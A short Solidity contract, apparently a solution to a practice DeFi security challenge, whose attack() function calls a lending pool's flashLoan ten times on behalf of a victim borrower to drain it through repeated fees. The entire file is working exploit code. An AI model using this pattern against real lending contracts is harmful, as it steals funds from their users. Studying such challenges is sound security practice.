// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    NaiveReceiverLenderPool private pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function attack(address borrower) external {
        for (int256 i = 0; i < 10; i++) {
            pool.flashLoan(borrower, 10);
        }
    }
}
